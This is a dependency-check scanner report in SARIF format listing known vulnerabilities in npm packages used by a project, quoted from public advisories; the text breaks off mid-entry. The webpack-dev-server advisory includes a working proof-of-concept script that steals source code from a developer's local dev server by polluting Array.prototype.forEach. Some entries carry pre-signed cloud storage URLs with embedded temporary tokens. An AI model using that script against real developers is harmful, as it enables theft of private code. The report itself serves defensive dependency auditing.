{"$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json","version": "2.1.0","runs": [{"tool": {"driver": {"name": "dependency-check","version": "12.1.3","informationUri": "https://dependency-check.github.io/DependencyCheck/","rules": [{"id": "GHSA-4v9v-hfq4-rm2v","shortDescription": {"text": "medium severity - GHSA-4v9v-hfq4-rm2v Exposed Dangerous Method or Function vulnerability in pkg:npm\/webpack-dev-server@4.7.3"},"fullDescription": {"text": "### Summary\nSource code may be stolen when you access a malicious web site.\n\n### Details\nBecause the request for classic script by a script tag is not subject to same origin policy, an attacker can inject `<script src=\"http:\/\/localhost:8080\/main.js\">` in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. Combined with prototype pollution, the attacker can get a reference to the webpack runtime variables.\nBy using `Function::toString` against the values in `__webpack_modules__`, the attacker can get the source code.\n\n### PoC\n1. Download [reproduction.zip](https:\/\/github.com\/user-attachments\/files\/18426585\/reproduction.zip) and extract it\n2. Run `npm i`\n3. Run `npx webpack-dev-server`\n4. Open `https:\/\/e29c9a88-a242-4fb4-9e64-b24c9d29b35b.pages.dev\/`\n5. You can see the source code output in the document and the devtools console.\n\n![image](https:\/\/github.com\/user-attachments\/assets\/9d4dcdca-5d24-4c84-a7b4-feb1782bca09)\n\nThe script in the POC site is:\n```js\nlet moduleList\nconst onHandlerSet = (handler) => {\n  console.log('h', handler)\n  moduleList = handler.require.m\n}\n\nconst originalArrayForEach = Array.prototype.forEach\nArray.prototype.forEach = function forEach(callback, thisArg) {\n  callback((handler) => {\n    onHandlerSet(handler)\n  })\n  originalArrayForEach.call(this, callback, thisArg)\n  Array.prototype.forEach = originalArrayForEach\n}\n\nconst script = document.createElement('script')\nscript.src = 'http:\/\/localhost:8080\/main.js'\nscript.addEventListener('load', () => {\n  console.log(moduleList)\n  for (const key in moduleList) {\n    const p = document.createElement('p')\n    const title = document.createElement('strong')\n    title.textContent = key\n    const code = document.createElement('code')\n    code.textContent = moduleList[key].toString()\n    p.append(title, ':', document.createElement('br'), code)\n    document.body.appendChild(p)\n  }\n})\ndocument.head.appendChild(script)\n```\n\nThis script uses the function generated by [`renderRequire`](https:\/\/github.com\/webpack\/webpack\/blob\/3919c844eca394d73ca930e4fc5506fb86e2b094\/lib\/javascript\/JavascriptModulesPlugin.js#L1383).\n```js\n    \/\/ The require function\n    function __webpack_require__(moduleId) {\n        \/\/ Check if module is in cache\n        var cachedModule = __webpack_module_cache__[moduleId];\n        if (cachedModule !== undefined) {\n            return cachedModule.exports;\n        }\n        \/\/ Create a new module (and put it into the cache)\n        var module = __webpack_module_cache__[moduleId] = {\n            \/\/ no module.id needed\n            \/\/ no module.loaded needed\n            exports: {}\n        };\n        \/\/ Execute the module function\n        var execOptions = {\n            id: moduleId,\n            module: module,\n            factory: __webpack_modules__[moduleId],\n            require: __webpack_require__\n        };\n        __webpack_require__.i.forEach(function(handler) {\n            handler(execOptions);\n        });\n        module = execOptions.module;\n        execOptions.factory.call(module.exports, module, module.exports, execOptions.require);\n        \/\/ Return the exports of the module\n        return module.exports;\n    }\n```\nEspecially, it uses the fact that `Array::forEach` is called for `__webpack_require__.i` and `execOptions` contains `__webpack_require__`.\nIt uses prototype pollution against `Array::forEach` to extract `__webpack_require__` reference.\n\n### Impact\nThis vulnerability can result in the source code to be stolen for users that uses a predictable port and output path for the entrypoint script.\n\n<details>\n<summary>Old content<\/summary>\n\n### Summary\nSource code may be stolen when you use [`output.iife: false`](https:\/\/webpack.js.org\/configuration\/output\/#outputiife) and access a malicious web site.\n\n### Details\nWhen `output.iife: false` is set, some global variables for the webpack runtime are declared on the `window` object (e.g. `__webpack_modules__`).\nBecause the request for classic script by a script tag is not subject to same origin policy, an attacker can inject `<script src=\"http:\/\/localhost:8080\/main.js\">` in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. By running that, the webpack runtime variables will be declared on the `window` object.\nBy using `Function::toString` against the values in `__webpack_modules__`, the attacker can get the source code.\n\nI pointed out `output.iife: false`, but if there are other options that makes the webpack runtime variables to be declared on the `window` object, the same will apply for those cases.\n\n### PoC\n1. Download [reproduction.zip](https:\/\/github.com\/user-attachments\/files\/18409777\/reproduction.zip) and extract it\n2. Run `npm i`\n3. Run `npx webpack-dev-server`\n4. Open `https:\/\/852aafa3-5f83-44da-9fc6-ea116d0e3035.pages.dev\/`\n5. Open the devtools console.\n6. You can see the content of `src\/index.js` and other scripts loaded.\n\n![image](https:\/\/github.com\/user-attachments\/assets\/87801607-57bb-4656-bc0d-2bfbe207f436)\n\nThe script in the POC site is:\n```js\nconst script = document.createElement('script')\nscript.src = 'http:\/\/localhost:8080\/main.js'\nscript.addEventListener('load', () => {\n    for (const module in window.__webpack_modules__) {\n        console.log(`${module}:`, window.__webpack_modules__[module].toString())\n    }\n})\ndocument.head.appendChild(script)\n```\n\n### Impact\nThis vulnerability can result in the source code to be stolen for users that has `output.iife: false` option set and uses a predictable port and output path for the entrypoint script.\n\n<\/details>"},"help": {"text": "","markdown": "For more information see [GHSA-4v9v-hfq4-rm2v](https://github.com/advisories/GHSA-4v9v-hfq4-rm2v)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 5.300000190734863,"security-severity": "5.300000190734863","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "HIGH","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "REQUIRED","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "HIGH","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "NONE","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "NPM"}},{"id": "CVE-2024-29180","shortDescription": {"text": "high severity - CVE-2024-29180 Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') vulnerability in pkg:npm\/webpack-dev-middleware@5.3.0"},"fullDescription": {"text": "Prior to versions 7.1.0, 6.1.2, and 5.3.4, the webpack-dev-middleware development middleware for devpack does not validate the supplied URL address sufficiently before returning the local file. It is possible to access any file on the developer's machine. The middleware can either work with the physical filesystem when reading the files or it can use a virtualized in-memory `memfs` filesystem. If `writeToDisk` configuration option is set to `true`, the physical filesystem is used. The `getFilenameFromUrl` method is used to parse URL and build the local file path. The public path prefix is stripped from the URL, and the `unsecaped` path suffix is appended to the `outputPath`. As the URL is not unescaped and normalized automatically before calling the midlleware, it is possible to use `%2e` and `%2f` sequences to perform path traversal attack.\n\nDevelopers using `webpack-dev-server` or `webpack-dev-middleware` are affected by the issue. When the project is started, an attacker might access any file on the developer's machine and exfiltrate the content. If the development server is listening on a public IP address (or `0.0.0.0`), an attacker on the local network can access the local files without any interaction from the victim (direct connection to the port). If the server allows access from third-party domains, an attacker can send a malicious link to the victim. When visited, the client side script can connect to the local server and exfiltrate the local files. Starting with fixed versions 7.1.0, 6.1.2, and 5.3.4, the URL is unescaped and normalized before any further processing."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.400000095367432,"security-severity": "7.400000095367432","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "REQUIRED","cvssv3_scope": "CHANGED","cvssv3_confidentialityImpact": "HIGH","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "NONE","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "CVE-2024-43800","shortDescription": {"text": "medium severity - CVE-2024-43800 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in pkg:npm\/serve-static@1.14.2"},"fullDescription": {"text": "serve-static serves static files. serve-static passes untrusted user input - even after sanitizing it - to redirect() may execute untrusted code. This issue is patched in serve-static 1.16.0.\n\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\/\/ossindex.sonatype.org\/vulnerability\/CVE-2024-43800 for details"},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 4.699999809265137,"security-severity": "4.699999809265137","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "HIGH","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "REQUIRED","cvssv3_scope": "CHANGED","cvssv3_confidentialityImpact": "LOW","cvssv3_integrityImpact": "LOW","cvssv3_availabilityImpact": "NONE","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "GHSA-f8q6-p94x-37v3","shortDescription": {"text": "high severity - GHSA-f8q6-p94x-37v3 Uncontrolled Resource Consumption vulnerability in pkg:npm\/minimatch@3.0.4"},"fullDescription": {"text": "A vulnerability was found in the minimatch package. This flaw allows a Regular Expression Denial of Service (ReDoS) when calling the braceExpand function with specific arguments, resulting in a Denial of Service."},"help": {"text": "","markdown": "For more information see [GHSA-f8q6-p94x-37v3](https://github.com/advisories/GHSA-f8q6-p94x-37v3)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.5,"security-severity": "7.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "NPM"}},{"id": "GHSA-w573-4hg7-7wgq","shortDescription": {"text": "high severity - GHSA-w573-4hg7-7wgq Improper Input Validation vulnerability in pkg:npm\/decode-uri-component@0.2.0"},"fullDescription": {"text": "decode-uri-component 0.2.0 is vulnerable to Improper Input Validation resulting in DoS."},"help": {"text": "","markdown": "For more information see [GHSA-w573-4hg7-7wgq](https://github.com/advisories/GHSA-w573-4hg7-7wgq)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.5,"security-severity": "7.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "NPM"}},{"id": "CVE-2024-37890","shortDescription": {"text": "high severity - CVE-2024-37890 NULL Pointer Dereference vulnerability in pkg:npm\/ws@8.2.3"},"fullDescription": {"text": "ws is an open source WebSocket client and server for Node.js. A request with a number of headers exceeding theserver.maxHeadersCount threshold could be used to crash a ws server. The vulnerability was fixed in ws@8.17.1 (e55e510) and backported to ws@7.5.10 (22c2876), ws@6.2.3 (eeb76d3), and ws@5.2.4 (4abd8f6). In vulnerable versions of ws, the issue can be mitigated in the following ways: 1. Reduce the maximum allowed length of the request headers using the --max-http-header-size=size and\/or the maxHeaderSize options so that no more headers than the server.maxHeadersCount limit can be sent. 2. Set server.maxHeadersCount to 0 so that no limit is applied."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv2_score": 8.699999809265137,"cvssv2_accessVector": "NETWORK","cvssv2_accessComplexity": "LOW","cvssv2_authenticationr": "$enc.json($rule.cvssv2Authentication)","cvssv2_confidentialityImpact": "$enc.json($rule.cvssv2ConfidentialityImpact)","cvssv2_integrityImpact": "$enc.json($rule.cvssv2IntegrityImpact)","cvssv2_availabilityImpact": "$enc.json($rule.cvssv2AvailabilityImpact)","cvssv2_severity": "HIGH","source": "OSSINDEX"}},{"id": "CVE-2022-25883","shortDescription": {"text": "high severity - CVE-2022-25883 Inefficient Regular Expression Complexity vulnerability in pkg:npm\/semver@5.7.1"},"fullDescription": {"text": "Versions of the package semver before 7.5.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the function new Range, when untrusted user data is provided as a range.\r\r\r\n\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\/\/ossindex.sonatype.org\/vulnerability\/CVE-2022-25883 for details"},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.5,"security-severity": "7.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "GHSA-f5x3-32g6-xq36","shortDescription": {"text": "medium severity - GHSA-f5x3-32g6-xq36 Uncontrolled Resource Consumption vulnerability in pkg:npm\/tar@6.1.11"},"fullDescription": {"text": "## Description: \nDuring some analysis today on npm's `node-tar` package I came across the folder creation process, Basicly if you provide node-tar with a path like this `.\/a\/b\/c\/foo.txt` it would create every folder and sub-folder here a, b and c until it reaches the last folder to create `foo.txt`, In-this case I noticed that there's no validation at all on the amount of folders being created, that said we're actually able to CPU and memory consume the system running node-tar and even crash the nodejs client within few seconds of running it using a path with too many sub-folders inside\n\n## Steps To Reproduce:\nYou can reproduce this issue by downloading the tar file I provided in the resources and using node-tar to extract it, you should get the same behavior as the video\n\n## Proof Of Concept:\nHere's a [video](https:\/\/hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com\/3i7uojw8s52psar6pg8zkdo4h9io?response-content-disposition=attachment%3B%20filename%3D%22tar-dos-poc.webm%22%3B%20filename%2A%3DUTF-8%27%27tar-dos-poc.webm&response-content-type=video%2Fwebm&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSWWGDXHA%2F20240312%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240312T080103Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDcaCXVzLXdlc3QtMiJHMEUCID3xYDc6emXVPOg8iVR5dVk0u3gguTPIDJ0OIE%2BKxj17AiEAi%2BGiay1gGMWhH%2F031fvMYnSsa8U7CnpZpxvFAYqNRwgqsQUIQBADGgwwMTM2MTkyNzQ4NDkiDAaj6OgUL3gg4hhLLCqOBUUrOgWSqaK%2FmxN6nKRvB4Who3LIyzswFKm9LV94GiSVFP3zXYA480voCmAHTg7eBL7%2BrYgV2RtXbhF4aCFMCN3qu7GeXkIdH7xwVMi9zXHkekviSKZ%2FsZtVVjn7RFqOCKhJl%2FCoiLQJuDuju%2FtfdTGZbEbGsPgKHoILYbRp81K51zeRL21okjsOehmypkZzq%2BoGrXIX0ynPOKujxw27uqdF4T%2BF9ynodq01vGgwgVBEjHojc4OKOfr1oW5b%2FtGVV59%2BOBVI1hqIKHRG0Ed4SWmp%2BLd1hazGuZPvp52szmegnOj5qr3ubppnKL242bX%2FuAnQKzKK0HpwolqXjsuEeFeM85lxhqHV%2B1BJqaqSHHDa0HUMLZistMRshRlntuchcFQCR6HBa2c8PSnhpVC31zMzvYMfKsI12h4HB6l%2FudrmNrvmH4LmNpi4dZFcio21DzKj%2FRjWmxjH7l8egDyG%2FIgPMY6Ls4IiN7aR1jijYTrBCgPUUHets3BFvqLzHtPFnG3B7%2FYRPnhCLu%2FgzvKN3F8l38KqeTNMHJaxkuhCvEjpFB2SJbi2QZqZZbLj3xASqXoogzbsyPp0Tzp0tH7EKDhPA7H6wwiZukXfFhhlYzP8on9fO2Ajz%2F%2BTDkDjbfWw4KNJ0cFeDsGrUspqQZb5TAKlUge7iOZEc2TZ5uagatSy9Mg08E4nImBSE5QUHDc7Daya1gyqrETMDZBBUHH2RFkGA9qMpEtNrtJ9G%2BPedz%2FpPY1hh9OCp9Pg1BrX97l3SfVzlAMRfNibhywq6qnE35rVnZi%2BEQ1UgBjs9jD%2FQrW49%2FaD0oUDojVeuFFryzRnQxDbKtYgonRcItTvLT5Y0xaK9P0u6H1197%2FMk3XxmjD9%2Fb%2BvBjqxAQWWkKiIxpC1oHEWK9Jt8UdJ39xszDBGpBqjB6Tvt5ePAXSyX8np%2FrBi%2BAPx06O0%2Ba7pU4NmH800EVXxxhgfj9nMw3CeoUIdxorVKtU2Mxw%2FLaAiPgxPS4rqkt65NF7eQYfegcSYDTm2Z%2BHPbz9HfCaVZ28Zqeko6sR%2F29ML4bguqVvHAM4mWPLNDXH33mjG%2BuzLi8e1BF7tNveg2X9G%2FRdcMkojwKYbu6xN3M6aX2alQg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1e8235d885f1d61529b7d6b23ea3a0780c300c91d86e925dd8310d5b661ddbe2) show-casing the exploit: \n\n## Impact\n\nDenial of service by crashing the nodejs client when attempting to parse a tar archive, make it run out of heap memory and consuming server CPU and memory resources\n\n## Report resources\n[payload.txt](https:\/\/hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com\/1e83ayb5dd3350fvj3gst0mqixwk?response-content-disposition=attachment%3B%20filename%3D%22payload.txt%22%3B%20filename%2A%3DUTF-8%27%27payload.txt&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSWWGDXHA%2F20240312%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240312T080103Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDcaCXVzLXdlc3QtMiJHMEUCID3xYDc6emXVPOg8iVR5dVk0u3gguTPIDJ0OIE%2BKxj17AiEAi%2BGiay1gGMWhH%2F031fvMYnSsa8U7CnpZpxvFAYqNRwgqsQUIQBADGgwwMTM2MTkyNzQ4NDkiDAaj6OgUL3gg4hhLLCqOBUUrOgWSqaK%2FmxN6nKRvB4Who3LIyzswFKm9LV94GiSVFP3zXYA480voCmAHTg7eBL7%2BrYgV2RtXbhF4aCFMCN3qu7GeXkIdH7xwVMi9zXHkekviSKZ%2FsZtVVjn7RFqOCKhJl%2FCoiLQJuDuju%2FtfdTGZbEbGsPgKHoILYbRp81K51zeRL21okjsOehmypkZzq%2BoGrXIX0ynPOKujxw27uqdF4T%2BF9ynodq01vGgwgVBEjHojc4OKOfr1oW5b%2FtGVV59%2BOBVI1hqIKHRG0Ed4SWmp%2BLd1hazGuZPvp52szmegnOj5qr3ubppnKL242bX%2FuAnQKzKK0HpwolqXjsuEeFeM85lxhqHV%2B1BJqaqSHHDa0HUMLZistMRshRlntuchcFQCR6HBa2c8PSnhpVC31zMzvYMfKsI12h4HB6l%2FudrmNrvmH4LmNpi4dZFcio21DzKj%2FRjWmxjH7l8egDyG%2FIgPMY6Ls4IiN7aR1jijYTrBCgPUUHets3BFvqLzHtPFnG3B7%2FYRPnhCLu%2FgzvKN3F8l38KqeTNMHJaxkuhCvEjpFB2SJbi2QZqZZbLj3xASqXoogzbsyPp0Tzp0tH7EKDhPA7H6wwiZukXfFhhlYzP8on9fO2Ajz%2F%2BTDkDjbfWw4KNJ0cFeDsGrUspqQZb5TAKlUge7iOZEc2TZ5uagatSy9Mg08E4nImBSE5QUHDc7Daya1gyqrETMDZBBUHH2RFkGA9qMpEtNrtJ9G%2BPedz%2FpPY1hh9OCp9Pg1BrX97l3SfVzlAMRfNibhywq6qnE35rVnZi%2BEQ1UgBjs9jD%2FQrW49%2FaD0oUDojVeuFFryzRnQxDbKtYgonRcItTvLT5Y0xaK9P0u6H1197%2FMk3XxmjD9%2Fb%2BvBjqxAQWWkKiIxpC1oHEWK9Jt8UdJ39xszDBGpBqjB6Tvt5ePAXSyX8np%2FrBi%2BAPx06O0%2Ba7pU4NmH800EVXxxhgfj9nMw3CeoUIdxorVKtU2Mxw%2FLaAiPgxPS4rqkt65NF7eQYfegcSYDTm2Z%2BHPbz9HfCaVZ28Zqeko6sR%2F29ML4bguqVvHAM4mWPLNDXH33mjG%2BuzLi8e1BF7tNveg2X9G%2FRdcMkojwKYbu6xN3M6aX2alQg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bad9fe731f05a63a950f99828125653a8c1254750fe0ca7be882e89ecdd449ae)\n[archeive.tar.gz](https:\/\/hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com\/ymkuh4xnfdcf1soeyi7jc2x4yt2i?response-content-disposition=attachment%3B%20filename%3D%22archive.tar.gz%22%3B%20filename%2A%3DUTF-8%27%27archive.tar.gz&response-content-type=application%2Fx-tar&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSWWGDXHA%2F20240312%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240312T080103Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDcaCXVzLXdlc3QtMiJHMEUCID3xYDc6emXVPOg8iVR5dVk0u3gguTPIDJ0OIE%2BKxj17AiEAi%2BGiay1gGMWhH%2F031fvMYnSsa8U7CnpZpxvFAYqNRwgqsQUIQBADGgwwMTM2MTkyNzQ4NDkiDAaj6OgUL3gg4hhLLCqOBUUrOgWSqaK%2FmxN6nKRvB4Who3LIyzswFKm9LV94GiSVFP3zXYA480voCmAHTg7eBL7%2BrYgV2RtXbhF4aCFMCN3qu7GeXkIdH7xwVMi9zXHkekviSKZ%2FsZtVVjn7RFqOCKhJl%2FCoiLQJuDuju%2FtfdTGZbEbGsPgKHoILYbRp81K51zeRL21okjsOehmypkZzq%2BoGrXIX0ynPOKujxw27uqdF4T%2BF9ynodq01vGgwgVBEjHojc4OKOfr1oW5b%2FtGVV59%2BOBVI1hqIKHRG0Ed4SWmp%2BLd1hazGuZPvp52szmegnOj5qr3ubppnKL242bX%2FuAnQKzKK0HpwolqXjsuEeFeM85lxhqHV%2B1BJqaqSHHDa0HUMLZistMRshRlntuchcFQCR6HBa2c8PSnhpVC31zMzvYMfKsI12h4HB6l%2FudrmNrvmH4LmNpi4dZFcio21DzKj%2FRjWmxjH7l8egDyG%2FIgPMY6Ls4IiN7aR1jijYTrBCgPUUHets3BFvqLzHtPFnG3B7%2FYRPnhCLu%2FgzvKN3F8l38KqeTNMHJaxkuhCvEjpFB2SJbi2QZqZZbLj3xASqXoogzbsyPp0Tzp0tH7EKDhPA7H6wwiZukXfFhhlYzP8on9fO2Ajz%2F%2BTDkDjbfWw4KNJ0cFeDsGrUspqQZb5TAKlUge7iOZEc2TZ5uagatSy9Mg08E4nImBSE5QUHDc7Daya1gyqrETMDZBBUHH2RFkGA9qMpEtNrtJ9G%2BPedz%2FpPY1hh9OCp9Pg1BrX97l3SfVzlAMRfNibhywq6qnE35rVnZi%2BEQ1UgBjs9jD%2FQrW49%2FaD0oUDojVeuFFryzRnQxDbKtYgonRcItTvLT5Y0xaK9P0u6H1197%2FMk3XxmjD9%2Fb%2BvBjqxAQWWkKiIxpC1oHEWK9Jt8UdJ39xszDBGpBqjB6Tvt5ePAXSyX8np%2FrBi%2BAPx06O0%2Ba7pU4NmH800EVXxxhgfj9nMw3CeoUIdxorVKtU2Mxw%2FLaAiPgxPS4rqkt65NF7eQYfegcSYDTm2Z%2BHPbz9HfCaVZ28Zqeko6sR%2F29ML4bguqVvHAM4mWPLNDXH33mjG%2BuzLi8e1BF7tNveg2X9G%2FRdcMkojwKYbu6xN3M6aX2alQg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5e2c0d4b4de40373ac0fe91908c2659141a6dd4ab850271cc26042a3885c82ea)\n\n## Note\nThis report was originally reported to GitHub bug bounty program, they asked me to report it to you a month ago"},"help": {"text": "","markdown": "For more information see [GHSA-f5x3-32g6-xq36](https://github.com/advisories/GHSA-f5x3-32g6-xq36)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 6.5,"security-severity": "6.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "REQUIRED","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "NPM"}},{"id": "CVE-2022-25881","shortDescription": {"text": "high severity - CVE-2022-25881 Inefficient Regular Expression Complexity vulnerability in pkg:npm\/http-cache-semantics@4.1.0"},"fullDescription": {"text": "This affects versions of the package http-cache-semantics before 4.1.1. The issue can be exploited via malicious request header values sent to a server, when that server reads the cache policy from the request using this library."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.5,"security-severity": "7.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "GHSA-r7qp-cfhv-p84w","shortDescription": {"text": "medium severity - GHSA-r7qp-cfhv-p84w Uncaught Exception vulnerability in pkg:npm\/engine.io@6.1.2"},"fullDescription": {"text": "### Impact\n\nA specially crafted HTTP request can trigger an uncaught exception on the Engine.IO server, thus killing the Node.js process.\n\n```\nevents.js:292\n      throw er; \/\/ Unhandled 'error' event\n      ^\n\nError: read ECONNRESET\n    at TCP.onStreamRead (internal\/stream_base_commons.js:209:20)\nEmitted 'error' event on Socket instance at:\n    at emitErrorNT (internal\/streams\/destroy.js:106:8)\n    at emitErrorCloseNT (internal\/streams\/destroy.js:74:3)\n    at processTicksAndRejections (internal\/process\/task_queues.js:80:21) {\n  errno: -104,\n  code: 'ECONNRESET',\n  syscall: 'read'\n}\n```\n\nThis impacts all the users of the [`engine.io`](https:\/\/www.npmjs.com\/package\/engine.io) package, including those who uses depending packages like [`socket.io`](https:\/\/www.npmjs.com\/package\/socket.io).\n\n### Patches\n\nA fix has been released today (2022\/11\/20):\n\n| Version range     | Fixed version |\n|-------------------|---------------|\n| `engine.io@3.x.y` | `3.6.1`       |\n| `engine.io@6.x.y` | `6.2.1`       |\n\nFor `socket.io` users:\n\n| Version range               | `engine.io` version | Needs minor update?                                                                                    |\n|-----------------------------|---------------------|--------------------------------------------------------------------------------------------------------|\n| `socket.io@4.5.x`           | `~6.2.0`            | `npm audit fix` should be sufficient                                                                   |\n| `socket.io@4.4.x`           | `~6.1.0`            | Please upgrade to `socket.io@4.5.x`                                                                    |\n| `socket.io@4.3.x`           | `~6.0.0`            | Please upgrade to `socket.io@4.5.x`                                                                    |\n| `socket.io@4.2.x`           | `~5.2.0`            | Please upgrade to `socket.io@4.5.x`                                                                    |\n| `socket.io@4.1.x`           | `~5.1.1`            | Please upgrade to `socket.io@4.5.x`                                                                    |\n| `socket.io@4.0.x`           | `~5.0.0`            | Please upgrade to `socket.io@4.5.x`                                                                    |\n| `socket.io@3.1.x`           | `~4.1.0`            | Please upgrade to `socket.io@4.5.x` (see [here](https:\/\/socket.io\/docs\/v4\/migrating-from-3-x-to-4-0\/)) |\n| `socket.io@3.0.x`           | `~4.0.0`            | Please upgrade to `socket.io@4.5.x` (see [here](https:\/\/socket.io\/docs\/v4\/migrating-from-3-x-to-4-0\/)) |\n| `socket.io@2.5.0`           | `~3.6.0`            | `npm audit fix` should be sufficient                                                                   |\n| `socket.io@2.4.x` and below | `~3.5.0`            | Please upgrade to `socket.io@2.5.0`                                                                    |\n\n### 